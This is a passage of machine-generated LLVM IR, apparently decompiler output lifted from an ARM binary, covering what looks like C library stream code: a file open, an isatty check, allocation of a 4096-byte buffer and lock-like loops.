  br i1 %v7_147b0, label %dec_label_pc_147b0._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_147b0
  %v2_147b4 = or i32 %v0_147bc.pre, 131072
  store i32 %v2_147b4, i32* @r4, align 4
  br label %dec_label_pc_147b0._crit_edge

dec_label_pc_147b0._crit_edge:                    ; preds = %dec_label_pc_147b0, %bb53
  %v0_147bc = phi i32 [ %v2_147b4, %bb53 ], [ %v0_147bc.pre, %dec_label_pc_147b0 ]
  %v0_147b8 = load i32, i32* @r7, align 4
  store i32 %v0_147b8, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_147c4 = call i32 @__libc_open(i32 %v0_147b8, i32 %v0_147bc)
  store i32 %v2_147c4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_147c8 = icmp slt i32 %v2_147c4, 0
  %v1_147cc = load i32, i32* @r5, align 4
  %v2_147cc = add i32 %v1_147cc, 4
  %v3_147cc = inttoptr i32 %v2_147cc to i32*
  store i32 %v2_147c4, i32* %v3_147cc, align 4
  br i1 %v1_147c8, label %dec_label_pc_146d8, label %.dec_label_pc_147d4_crit_edge

.dec_label_pc_147d4_crit_edge:                    ; preds = %dec_label_pc_147b0._crit_edge
  %v0_147d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_147d4

dec_label_pc_147d4:                               ; preds = %.dec_label_pc_147d4_crit_edge, %dec_label_pc_147a4
  %v0_147f0 = phi i32 [ %v0_147d8.pre, %.dec_label_pc_147d4_crit_edge ], [ %v2_147a8, %dec_label_pc_147a4 ]
  %v0_147d4 = load i32, i32* @r5, align 4
  %v1_147d4 = inttoptr i32 %v0_147d4 to i16*
  %v2_147d4 = load i16, i16* %v1_147d4, align 2
  %v3_147d4 = zext i16 %v2_147d4 to i32
  %v1_147d8 = urem i32 %v0_147f0, 4
  %v1_147dc = and i32 %v0_147f0, 1024
  %v1_147e0 = and i32 %v3_147d4, 8192
  %v1_147e4 = add nuw nsw i32 %v1_147d8, 1
  %v2_147e8 = or i32 %v1_147e0, %v1_147dc
  store i32 %v2_147e8, i32* %r3.global-to-local, align 4
  %v1_147ec = xor i32 %v1_147e4, 3
  %v1_147f0 = and i32 %v0_147f0, 131072
  store i32 %v1_147f0, i32* %r2.global-to-local, align 4
  %v2_147f0 = icmp eq i32 %v1_147f0, 0
  %v1_147f4 = add i32 %v0_147d4, 4
  %v2_147f4 = inttoptr i32 %v1_147f4 to i32*
  %v3_147f4 = load i32, i32* %v2_147f4, align 4
  store i32 %v3_147f4, i32* @r4, align 4
  br i1 %v2_147f0, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_147d4
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_147d4, %bb54
  %v0_14800 = phi i32 [ 0, %dec_label_pc_147d4 ], [ 32768, %bb54 ]
  %v4_147fc = mul nuw nsw i32 %v1_147ec, 16
  %v5_147fc = or i32 %v2_147e8, %v4_147fc
  store i32 %v5_147fc, i32* %r3.global-to-local, align 4
  %v2_14800 = or i32 %v0_14800, %v5_147fc
  store i32 %v2_14800, i32* %r2.global-to-local, align 4
  %v2_14804 = icmp ugt i32 %v3_147f4, 2147483646
  store i1 %v2_14804, i1* %cpsr_c.global-to-local, align 1
  %v8_14804 = icmp eq i32 %v3_147f4, 2147483647
  %v1_14808 = trunc i32 %v2_14800 to i16
  store i16 %v1_14808, i16* %v1_147d4, align 2
  br i1 %v8_14804, label %dec_label_pc_14848, label %dec_label_pc_14810

dec_label_pc_14810:                               ; preds = %bb55
  store i32 ptrtoint (i32* @global_var_c54c.839 to i32), i32* %r3.global-to-local, align 4
  %v0_14814 = call i32 @__aeabi_read_tp()
  %v3_14818 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_14818 = sext i16 %v3_14818 to i32
  store i32 %v4_14818, i32* @r3, align 4
  store i32 %v0_14814, i32* @r6, align 4
  %v0_14820 = load i32, i32* @r4, align 4
  store i32 %v0_14820, i32* @r0, align 4
  %v2_14824 = add i32 %v4_14818, %v0_14814
  %v3_14824 = inttoptr i32 %v2_14824 to i32*
  %v4_14824 = load i32, i32* %v3_14824, align 4
  store i32 %v4_14824, i32* @r4, align 4
  %v1_14828 = call i32 @isatty(i32 %v0_14820)
  store i32 %v1_14828, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1482c = icmp eq i32 %v1_14828, 0
  br i1 %v2_1482c, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_14810
  %v1_14830 = load i32, i32* @r5, align 4
  %v2_14830 = inttoptr i32 %v1_14830 to i16*
  %v3_14830 = load i16, i16* %v2_14830, align 2
  %v4_14830 = zext i16 %v3_14830 to i32
  %v2_14834 = or i32 %v4_14830, 256
  store i32 %v2_14834, i32* %r3.global-to-local, align 4
  %v2_14838 = trunc i32 %v2_14834 to i16
  store i16 %v2_14838, i16* %v2_14830, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_14810, %bb56
  %v3_14840 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_14840 = sext i16 %v3_14840 to i32
  store i32 %v4_14840, i32* %r3.global-to-local, align 4
  %v0_14844 = load i32, i32* @r4, align 4
  %v1_14844 = load i32, i32* @r6, align 4
  %v3_14844 = add i32 %v1_14844, %v4_14840
  %v4_14844 = inttoptr i32 %v3_14844 to i32*
  store i32 %v0_14844, i32* %v4_14844, align 4
  br label %dec_label_pc_14848

dec_label_pc_14848:                               ; preds = %bb55, %.thread5
  %v0_14848 = load i32, i32* @r5, align 4
  %v1_14848 = add i32 %v0_14848, 8
  %v2_14848 = inttoptr i32 %v1_14848 to i32*
  %v3_14848 = load i32, i32* %v2_14848, align 4
  store i32 %v3_14848, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1484c = icmp eq i32 %v3_14848, 0
  br i1 %v2_1484c, label %dec_label_pc_14854, label %bb57

dec_label_pc_14854:                               ; preds = %dec_label_pc_14848
  store i32 4096, i32* @r0, align 4
  %v0_14858 = call i32 @malloc()
  store i32 %v0_14858, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1485c = icmp eq i32 %v0_14858, 0
  %v1_1486c.pre = load i32, i32* @r5, align 4
  br i1 %v2_1485c, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14854
  %v2_14860 = inttoptr i32 %v1_1486c.pre to i16*
  %v3_14860 = load i16, i16* %v2_14860, align 2
  %v4_14860 = zext i16 %v3_14860 to i32
  %v2_14864 = add i32 %v0_14858, 4096
  store i32 %v2_14864, i32* %r2.global-to-local, align 4
  %v2_14868 = or i32 %v4_14860, 16384
  store i32 %v2_14868, i32* %r3.global-to-local, align 4
  %v2_1486c = add i32 %v1_1486c.pre, 8
  %v3_1486c = inttoptr i32 %v2_1486c to i32*
  store i32 %v0_14858, i32* %v3_1486c, align 4
  %v1_14870 = load i32, i32* %r2.global-to-local, align 4
  %v2_14870 = load i32, i32* @r5, align 4
  %v3_14870 = add i32 %v2_14870, 12
  %v4_14870 = inttoptr i32 %v3_14870 to i32*
  store i32 %v1_14870, i32* %v4_14870, align 4
  %v1_14874 = load i32, i32* %r3.global-to-local, align 4
  %v2_14874 = trunc i32 %v1_14874 to i16
  %v3_14874 = load i32, i32* @r5, align 4
  %v4_14874 = inttoptr i32 %v3_14874 to i16*
  store i16 %v2_14874, i16* %v4_14874, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_14854
  %v2_1486c37 = add i32 %v1_1486c.pre, 8
  %v3_1486c38 = inttoptr i32 %v2_1486c37 to i32*
  store i32 0, i32* %v3_1486c38, align 4
  %v2_14878 = load i32, i32* @r5, align 4
  %v3_14878 = add i32 %v2_14878, 12
  %v4_14878 = inttoptr i32 %v3_14878 to i32*
  store i32 0, i32* %v4_14878, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_14848, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_14884 = load i32, i32* @r8, align 4
  %v2_14884 = add i32 %v0_14884, 92
  %v3_14884 = inttoptr i32 %v2_14884 to i32*
  %v4_14884 = load i32, i32* %v3_14884, align 4
  store i32 %v4_14884, i32* %r3.global-to-local, align 4
  %v2_14888 = load i32, i32* @r5, align 4
  %v3_14888 = add i32 %v2_14888, 2
  %v4_14888 = inttoptr i32 %v3_14888 to i8*
  store i8 0, i8* %v4_14888, align 1
  %v0_1488c = load i32, i32* @r5, align 4
  %v1_1488c = inttoptr i32 %v0_1488c to i16*
  %v2_1488c = load i16, i16* %v1_1488c, align 2
  %v3_1488c = zext i16 %v2_1488c to i32
  store i32 %v3_1488c, i32* %r2.global-to-local, align 4
  %v0_14890 = load i32, i32* %r3.global-to-local, align 4
  %v1_14890 = inttoptr i32 %v0_14890 to i32*
  %v2_14890 = load i32, i32* %v1_14890, align 4
  store i32 %v2_14890, i32* @r1, align 4
  %v1_14894 = add i32 %v0_1488c, 8
  %v2_14894 = inttoptr i32 %v1_14894 to i32*
  %v3_14894 = load i32, i32* %v2_14894, align 4
  store i32 %v3_14894, i32* %r3.global-to-local, align 4
  %v1_14898 = and i32 %v3_1488c, 8192
  %v2_14898 = icmp eq i32 %v1_14898, 0
  %v2_1489c = add i32 %v0_1488c, 20
  %v3_1489c = inttoptr i32 %v2_1489c to i32*
  store i32 %v3_14894, i32* %v3_1489c, align 4
  %v0_148a0 = load i32, i32* @r1, align 4
  %v1_148a0 = load i32, i32* @r5, align 4
  %v2_148a0 = add i32 %v1_148a0, 52
  %v3_148a0 = inttoptr i32 %v2_148a0 to i32*
  store i32 %v0_148a0, i32* %v3_148a0, align 4
  %v0_148a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_148a4 = load i32, i32* @r5, align 4
  %v2_148a4 = add i32 %v1_148a4, 24
  %v3_148a4 = inttoptr i32 %v2_148a4 to i32*
  store i32 %v0_148a4, i32* %v3_148a4, align 4
  %v0_148a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_148a8 = load i32, i32* @r5, align 4
  %v2_148a8 = add i32 %v1_148a8, 28
  %v3_148a8 = inttoptr i32 %v2_148a8 to i32*
  store i32 %v0_148a8, i32* %v3_148a8, align 4
  %v0_148ac = load i32, i32* %r3.global-to-local, align 4
  %v1_148ac = load i32, i32* @r5, align 4
  %v2_148ac = add i32 %v1_148ac, 16
  %v3_148ac = inttoptr i32 %v2_148ac to i32*
  store i32 %v0_148ac, i32* %v3_148ac, align 4
  %v0_148b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_148b0 = load i32, i32* @r5, align 4
  %v2_148b0 = add i32 %v1_148b0, 44
  %v3_148b0 = inttoptr i32 %v2_148b0 to i32*
  store i32 %v0_148b0, i32* %v3_148b0, align 4
  br i1 %v2_14898, label %dec_label_pc_14a98, label %dec_label_pc_148b8

dec_label_pc_148b8:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_148bc = load i32, i32* @r8, align 4
  %v2_148bc = add i32 %v0_148bc, 160
  %v3_148bc = inttoptr i32 %v2_148bc to i32*
  %v4_148bc = load i32, i32* %v3_148bc, align 4
  store i32 %v4_148bc, i32* %r7.global-to-local, align 4
  %v0_148c0 = call i32 @__aeabi_read_tp()
  store i32 %v0_148c0, i32* %r0.global-to-local, align 4
  %v1_148c4 = add i32 %v4_148bc, 8
  %v2_148c4 = inttoptr i32 %v1_148c4 to i32*
  %v3_148c4 = load i32, i32* %v2_148c4, align 4
  store i32 %v3_148c4, i32* %r3.global-to-local, align 4
  %v1_148c8 = add i32 %v0_148c0, -1168
  store i32 %v1_148c8, i32* %r6.global-to-local, align 4
  %v3_148cc = icmp uge i32 %v3_148c4, %v1_148c8
  store i1 %v3_148cc, i1* %cpsr_c.global-to-local, align 1
  %v9_148cc = icmp eq i32 %v3_148c4, %v1_148c8
  br i1 %v9_148cc, label %dec_label_pc_14910, label %dec_label_pc_148d4

dec_label_pc_148d4:                               ; preds = %dec_label_pc_148b8
  store i32 %v4_148bc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_148dc

dec_label_pc_148dc:                               ; preds = %dec_label_pc_148e8.dec_label_pc_148dc_crit_edge, %dec_label_pc_148d4
  %v0_148dc = phi i32 [ %v0_148dc.pre, %dec_label_pc_148e8.dec_label_pc_148dc_crit_edge ], [ %v4_148bc, %dec_label_pc_148d4 ]
  %v1_148dc = inttoptr i32 %v0_148dc to i32*
  %v2_148dc = load i32, i32* %v1_148dc, align 4
  store i32 %v2_148dc, i32* %r3.global-to-local, align 4
  %v1_148e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_148e0 = icmp uge i32 %v2_148dc, %v1_148e0
  store i1 %v3_148e0, i1* %cpsr_c.global-to-local, align 1
  %v9_148e0 = icmp eq i32 %v2_148dc, %v1_148e0
  br i1 %v9_148e0, label %dec_label_pc_148e8, label %dec_label_pc_14900

dec_label_pc_148e8:                               ; preds = %dec_label_pc_148dc
  store i32 %v2_148dc, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_148f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_148f8, label %dec_label_pc_148fc, label %dec_label_pc_148e8.dec_label_pc_148dc_crit_edge

dec_label_pc_148e8.dec_label_pc_148dc_crit_edge:  ; preds = %dec_label_pc_148e8
  %v0_148dc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_148dc

dec_label_pc_148fc:                               ; preds = %dec_label_pc_148e8
  %v0_148fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_148fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14900

dec_label_pc_14900:                               ; preds = %dec_label_pc_148dc, %dec_label_pc_148fc
  %v0_14900 = phi i32 [ %v0_148fc, %dec_label_pc_148fc ], [ %v2_148dc, %dec_label_pc_148dc ]
  %v1_14900 = phi i32 [ %v0_148fc, %dec_label_pc_148fc ], [ %v1_148e0, %dec_label_pc_148dc ]
  %v3_14900 = icmp uge i32 %v0_14900, %v1_14900
  store i1 %v3_14900, i1* %cpsr_c.global-to-local, align 1
  %v9_14900 = icmp eq i32 %v0_14900, %v1_14900
  br i1 %v9_14900, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_14900
  %v1_14904 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_14904, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_14900, %bb58
  %v1_14908 = xor i1 %v9_14900, true
  call void @__pseudo_cond_branch(i1 %v1_14908, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_1490c = load i32, i32* %r6.global-to-local, align 4
  %v1_1490c = load i32, i32* %r7.global-to-local, align 4
  %v2_1490c = add i32 %v1_1490c, 8
  %v3_1490c = inttoptr i32 %v2_1490c to i32*
  store i32 %v0_1490c, i32* %v3_1490c, align 4
  %v1_1492c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14910

dec_label_pc_14910:                               ; preds = %dec_label_pc_148b8, %bb59
  %v1_1492c = phi i32 [ %v3_148c4, %dec_label_pc_148b8 ], [ %v1_1492c.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_14914 = load i32, i32* @r8, align 4
  %v2_14914 = add i32 %v0_14914, 160
  %v3_14914 = inttoptr i32 %v2_14914 to i32*
  %v4_14914 = load i32, i32* %v3_14914, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_1491c = add i32 %v0_14914, 152
  %v3_1491c = inttoptr i32 %v2_1491c to i32*
  %v4_1491c = load i32, i32* %v3_1491c, align 4
  store i32 %v4_1491c, i32* %r7.global-to-local, align 4
  %v1_14920 = add i32 %v4_14914, 4
  %v2_14920 = inttoptr i32 %v1_14920 to i32*
  %v3_14920 = load i32, i32* %v2_14920, align 4
  store i32 %v3_14920, i32* %r3.global-to-local, align 4
  %v1_14924 = add i32 %v4_1491c, 8
  %v2_14924 = inttoptr i32 %v1_14924 to i32*
  %v3_14924 = load i32, i32* %v2_14924, align 4
  store i32 %v3_14924, i32* %r2.global-to-local, align 4
  %v1_14928 = add i32 %v3_14920, 1
  store i32 %v1_14928, i32* %r3.global-to-local, align 4
  %v3_1492c = icmp uge i32 %v3_14924, %v1_1492c
  store i1 %v3_1492c, i1* %cpsr_c.global-to-local, align 1
  %v9_1492c = icmp eq i32 %v3_14924, %v1_1492c
  store i32 %v1_14928, i32* %v2_14920, align 4
  br i1 %v9_1492c, label %dec_label_pc_14978, label %dec_label_pc_14938

dec_label_pc_14938:                               ; preds = %dec_label_pc_14910
  %v0_1493c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1493c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1494495 = inttoptr i32 %v0_1493c to i32*
  %v2_1494496 = load i32, i32* %v1_1494495, align 4
  store i32 %v2_1494496, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1494898 = icmp eq i32 %v2_1494496, 0
  br i1 %v9_1494898, label %dec_label_pc_14950, label %dec_label_pc_14968

dec_label_pc_14950:                               ; preds = %dec_label_pc_14938, %dec_label_pc_14950.dec_label_pc_14944_crit_edge
  %v0_1495099 = phi i32 [ %v1_14948.pre, %dec_label_pc_14950.dec_label_pc_14944_crit_edge ], [ 0, %dec_label_pc_14938 ]
  store i32 %v0_1495099, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14960 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14960, label %dec_label_pc_14964, label %dec_label_pc_14950.dec_label_pc_14944_crit_edge

dec_label_pc_14950.dec_label_pc_14944_crit_edge:  ; preds = %dec_label_pc_14950
  %v0_14944.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14948.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14944 = inttoptr i32 %v0_14944.pre to i32*
  %v2_14944 = load i32, i32* %v1_14944, align 4
  store i32 %v2_14944, i32* %r3.global-to-local, align 4
  %v3_14948 = icmp uge i32 %v2_14944, %v1_14948.pre
  store i1 %v3_14948, i1* %cpsr_c.global-to-local, align 1
  %v9_14948 = icmp eq i32 %v2_14944, %v1_14948.pre
  br i1 %v9_14948, label %dec_label_pc_14950, label %dec_label_pc_14968

dec_label_pc_14964:                               ; preds = %dec_label_pc_14950
  %v0_14964 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14964, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14968

dec_label_pc_14968:                               ; preds = %dec_label_pc_14938, %dec_label_pc_14950.dec_label_pc_14944_crit_edge, %dec_label_pc_14964
  %v0_14968 = phi i32 [ %v0_14964, %dec_label_pc_14964 ], [ %v2_1494496, %dec_label_pc_14938 ], [ %v2_14944, %dec_label_pc_14950.dec_label_pc_14944_crit_edge ]
  %v1_14968 = phi i32 [ %v0_14964, %dec_label_pc_14964 ], [ 0, %dec_label_pc_14938 ], [ %v1_14948.pre, %dec_label_pc_14950.dec_label_pc_14944_crit_edge ]
  %v3_14968 = icmp uge i32 %v0_14968, %v1_14968
  store i1 %v3_14968, i1* %cpsr_c.global-to-local, align 1
  %v9_14968 = icmp eq i32 %v0_14968, %v1_14968
  br i1 %v9_14968, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_14968
  %v1_1496c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1496c, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_14968, %bb60
  %v1_14970 = xor i1 %v9_14968, true
  call void @__pseudo_cond_branch(i1 %v1_14970, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_14974 = load i32, i32* %r6.global-to-local, align 4
  %v1_14974 = load i32, i32* %r7.global-to-local, align 4
  %v2_14974 = add i32 %v1_14974, 8
  %v3_14974 = inttoptr i32 %v2_14974 to i32*
  store i32 %v0_14974, i32* %v3_14974, align 4
  br label %dec_label_pc_14978

dec_label_pc_14978:                               ; preds = %dec_label_pc_14910, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_1497c = load i32, i32* @r8, align 4
  %v2_1497c = add i32 %v0_1497c, 152
  %v3_1497c = inttoptr i32 %v2_1497c to i32*
  %v4_1497c = load i32, i32* %v3_1497c, align 4
  store i32 %v4_1497c, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_14984 = add i32 %v0_1497c, 76
  %v3_14984 = inttoptr i32 %v2_14984 to i32*
  %v4_14984 = load i32, i32* %v3_14984, align 4
  store i32 %v4_14984, i32* @r1, align 4
  %v1_14988 = add i32 %v4_1497c, 4
  %v2_14988 = inttoptr i32 %v1_14988 to i32*
  %v3_14988 = load i32, i32* %v2_14988, align 4
  store i32 %v3_14988, i32* %r3.global-to-local, align 4
  %v1_1498c = inttoptr i32 %v4_14984 to i32*
  %v2_1498c = load i32, i32* %v1_1498c, align 4
  store i32 %v2_1498c, i32* %r2.global-to-local, align 4
  %v1_14990 = add i32 %v3_14988, 1
  store i32 %v1_14990, i32* %r3.global-to-local, align 4
  store i32 %v1_14990, i32* %v2_14988, align 4
  %v0_14998 = load i32, i32* %r2.global-to-local, align 4
  %v1_14998 = load i32, i32* @r5, align 4
  %v2_14998 = add i32 %v1_14998, 32
  %v3_14998 = inttoptr i32 %v2_14998 to i32*
  store i32 %v0_14998, i32* %v3_14998, align 4
  %v0_1499c = load i32, i32* %r0.global-to-local, align 4
  %v1_1499c = add i32 %v0_1499c, 4
  %v2_1499c = inttoptr i32 %v1_1499c to i32*
  %v3_1499c = load i32, i32* %v2_1499c, align 4
  %v1_149a0 = add i32 %v3_1499c, -1
  store i32 %v1_149a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_149a4 = icmp eq i32 %v1_149a0, 0
  %v0_149a8 = load i32, i32* @r5, align 4
  %v1_149a8 = load i32, i32* @r1, align 4
  %v2_149a8 = inttoptr i32 %v1_149a8 to i32*
  store i32 %v0_149a8, i32* %v2_149a8, align 4
  %v0_149ac = load i32, i32* %r3.global-to-local, align 4
  %v1_149ac = load i32, i32* %r0.global-to-local, align 4
  %v2_149ac = add i32 %v1_149ac, 4
  %v3_149ac = inttoptr i32 %v2_149ac to i32*
  store i32 %v0_149ac, i32* %v3_149ac, align 4
  br i1 %v2_149a4, label %dec_label_pc_149b4, label %dec_label_pc_14a14

dec_label_pc_149b4:                               ; preds = %dec_label_pc_14978
  %v0_149b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_149b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_149b4 = add i32 %v1_149b4, 8
  %v3_149b4 = inttoptr i32 %v2_149b4 to i32*
  store i32 %v0_149b4, i32* %v3_149b4, align 4
  %v0_149b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_149b8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_149bc

dec_label_pc_149bc:                               ; preds = %dec_label_pc_149ec.dec_label_pc_149bc_crit_edge, %dec_label_pc_149b4
  %v0_149bc = phi i32 [ %v0_149bc.pre, %dec_label_pc_149ec.dec_label_pc_149bc_crit_edge ], [ %v0_149b8, %dec_label_pc_149b4 ]
  %v1_149bc = inttoptr i32 %v0_149bc to i32*
  %v2_149bc = load i32, i32* %v1_149bc, align 4
  store i32 %v2_149bc, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_149bc, i32* %r2.global-to-local, align 4
  %v2_149c883 = load i32, i32* %v1_149bc, align 4
  store i32 %v2_149c883, i32* %r3.global-to-local, align 4
  %v3_149cc85 = icmp uge i32 %v2_149c883, %v2_149bc
  store i1 %v3_149cc85, i1* %cpsr_c.global-to-local, align 1
  %v9_149cc91 = icmp eq i32 %v2_149c883, %v2_149bc
  br i1 %v9_149cc91, label %dec_label_pc_149d4, label %dec_label_pc_149ec

dec_label_pc_149d4:                               ; preds = %dec_label_pc_149bc, %dec_label_pc_149d4.dec_label_pc_149c8_crit_edge
  %v0_149d492 = phi i32 [ %v1_149cc.pre, %dec_label_pc_149d4.dec_label_pc_149c8_crit_edge ], [ %v2_149bc, %dec_label_pc_149bc ]
  store i32 %v0_149d492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_149e4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_149e4, label %dec_label_pc_149e8, label %dec_label_pc_149d4.dec_label_pc_149c8_crit_edge

dec_label_pc_149d4.dec_label_pc_149c8_crit_edge:  ; preds = %dec_label_pc_149d4
  %v0_149c8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_149cc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_149c8 = inttoptr i32 %v0_149c8.pre to i32*
  %v2_149c8 = load i32, i32* %v1_149c8, align 4
  store i32 %v2_149c8, i32* %r3.global-to-local, align 4
  %v3_149cc = icmp uge i32 %v2_149c8, %v1_149cc.pre
  store i1 %v3_149cc, i1* %cpsr_c.global-to-local, align 1
  %v9_149cc = icmp eq i32 %v2_149c8, %v1_149cc.pre
  br i1 %v9_149cc, label %dec_label_pc_149d4, label %dec_label_pc_149ec

dec_label_pc_149e8:                               ; preds = %dec_label_pc_149d4
  %v0_149e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_149e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_149ec

dec_label_pc_149ec:                               ; preds = %dec_label_pc_149bc, %dec_label_pc_149d4.dec_label_pc_149c8_crit_edge, %dec_label_pc_149e8
  %v0_149f4 = phi i32 [ %v0_149e8, %dec_label_pc_149e8 ], [ %v2_149c883, %dec_label_pc_149bc ], [ %v2_149c8, %dec_label_pc_149d4.dec_label_pc_149c8_crit_edge ]
  %v1_149ec = phi i32 [ %v0_149e8, %dec_label_pc_149e8 ], [ %v2_149bc, %dec_label_pc_149bc ], [ %v1_149cc.pre, %dec_label_pc_149d4.dec_label_pc_149c8_crit_edge ]
  %v3_149ec = icmp uge i32 %v0_149f4, %v1_149ec
  store i1 %v3_149ec, i1* %cpsr_c.global-to-local, align 1
  %v9_149ec = icmp eq i32 %v0_149f4, %v1_149ec
  br i1 %v9_149ec, label %dec_label_pc_149f4, label %dec_label_pc_149ec.dec_label_pc_149bc_crit_edge

dec_label_pc_149ec.dec_label_pc_149bc_crit_edge:  ; preds = %dec_label_pc_149ec
  %v0_149bc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_149bc

dec_label_pc_149f4:                               ; preds = %dec_label_pc_149ec
  %v2_149f4 = icmp ne i32 %v1_149ec, 0
  store i1 %v2_149f4, i1* %cpsr_c.global-to-local, align 1
  %v7_149f8 = icmp slt i32 %v1_149ec, 2
  br i1 %v7_149f8, label %dec_label_pc_14a14, label %dec_label_pc_149fc

dec_label_pc_149fc:                               ; preds = %dec_label_pc_149f4
  %v0_149fc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_149fc, i32* %r0.global-to-local, align 4
  %v0_14a00 = load i32, i32* @r1, align 4
  %v1_14a00 = add i32 %v0_14a00, 129
  store i32 %v1_14a00, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14a14

dec_label_pc_14a14:                               ; preds = %dec_label_pc_14978, %dec_label_pc_149fc, %dec_label_pc_149f4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_14a18 = load i32, i32* @r8, align 4
  %v2_14a18 = add i32 %v0_14a18, 160
  %v3_14a18 = inttoptr i32 %v2_14a18 to i32*
  %v4_14a18 = load i32, i32* %v3_14a18, align 4
  store i32 %v4_14a18, i32* %r0.global-to-local, align 4
  %v1_14a1c = add i32 %v4_14a18, 4
  %v2_14a1c = inttoptr i32 %v1_14a1c to i32*
  %v3_14a1c = load i32, i32* %v2_14a1c, align 4
  %v1_14a20 = add i32 %v3_14a1c, -1
  store i32 %v1_14a20, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14a24 = icmp eq i32 %v1_14a20, 0
  store i32 %v1_14a20, i32* %v2_14a1c, align 4
  br i1 %v2_14a24, label %dec_label_pc_14a30, label %dec_label_pc_14a98

dec_label_pc_14a30:                               ; preds = %dec_label_pc_14a14
  %v0_14a30 = load i32, i32* %r3.global-to-local, align 4
  %v1_14a30 = load i32, i32* %r0.global-to-local, align 4
  %v2_14a30 = add i32 %v1_14a30, 8
  %v3_14a30 = inttoptr i32 %v2_14a30 to i32*
  store i32 %v0_14a30, i32* %v3_14a30, align 4
  %v0_14a34 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14a34, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14a38

dec_label_pc_14a38:                               ; preds = %dec_label_pc_14a68.dec_label_pc_14a38_crit_edge, %dec_label_pc_14a30
  %v0_14a38 = phi i32 [ %v0_14a38.pre, %dec_label_pc_14a68.dec_label_pc_14a38_crit_edge ], [ %v0_14a34, %dec_label_pc_14a30 ]
  %v1_14a38 = inttoptr i32 %v0_14a38 to i32*
  %v2_14a38 = load i32, i32* %v1_14a38, align 4
  store i32 %v2_14a38, i32* %r4.global-to-local, align 4
